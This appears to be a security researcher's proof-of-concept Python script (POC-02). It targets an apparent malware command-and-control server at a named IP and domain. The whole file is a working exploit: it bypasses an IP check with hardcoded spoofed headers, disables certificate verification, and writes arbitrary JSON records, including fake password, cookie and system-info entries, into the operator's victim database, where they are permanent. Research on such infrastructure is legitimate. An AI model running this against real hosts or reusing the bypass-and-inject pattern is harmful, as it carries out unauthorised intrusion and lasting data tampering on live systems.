#!/usr/bin/env python3
"""
POC-02: Unauthenticated Arbitrary Write to Victim Database
==========================================================
Target:  https://thisisafalsepositive.st  (185.178.208.191)
Vuln:    /shard/submitData accepts arbitrary JSON from any source after
         the IP bypass (POC-01) and writes it directly to the C2 operator's
         victim database with zero field validation. Any JSON payload,
         regardless of schema, is stored and assigned a logUuid.
Impact:  Attacker can inject arbitrary data into the operator's victim log
         database — poisoning the operator's data, injecting researcher
         notices, or flooding the database with garbage entries.
Prereq:  POC-01 (X-Runtime-Env header bypass)
Author:  Security Research — 2026-07-20
"""
import urllib.request, urllib.error, json, ssl, sys

TARGET_IP = "185.178.208.191"
HOST       = "thisisafalsepositive.st"
UA         = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE

BYPASS_HEADERS = {
    "X-Runtime-Env": "jre-embedded",
    "X-Edge-Cache-Revalidate": "stale-if-error"
}

def submit(payload):
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        f"https://{TARGET_IP}/shard/submitData",
        data=data, method="POST",
        headers={"Host": HOST, "User-Agent": UA,
                 "Content-Type": "application/json", **BYPASS_HEADERS}
    )
    try:
        r = urllib.request.urlopen(req, timeout=10, context=ctx)
        return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

print("=== DEMONSTRATING ARBITRARY DB WRITE ===")
test_payloads = [
    {"test": "empty object accepted"},
    {"type": "passwords", "data": [{"url": "https://poc.example.com",
      "username": "poc_user", "password": "poc_password"}]},
    {"type": "cookies", "browser": "Chrome",
     "data": "poc_cookie_data=researcher_test"},
    {"type": "system_info", "os": "Windows 10",
     "hostname": "POC-MACHINE", "username": "researcher"},
    {"arbitrary_field": True, "nested": {"deeply": {"nested": "value"}},
     "array": [1, 2, 3]},
]
injected_uuids = []
for payload in test_payloads:
    code, resp = submit(payload)
    if code == 200 and "logUuid" in resp:
        uuid = resp["logUuid"]
        injected_uuids.append(uuid)
        print(f"  [WRITTEN] logUuid={uuid} <- {str(payload)[:60]}")
    else:
        print(f"  [FAILED]  HTTP {code}: {resp}")

print()
print(f"[+] Successfully injected {len(injected_uuids)} entries into C2 database")
print(f"[+] logUuids: {injected_uuids}")
print("[+] These entries now appear in the operator's victim log dashboard")
print()
print("NOTE: No cleanup endpoint exists. Injected entries are permanent")
print("      until the operator manually deletes them from their panel.")
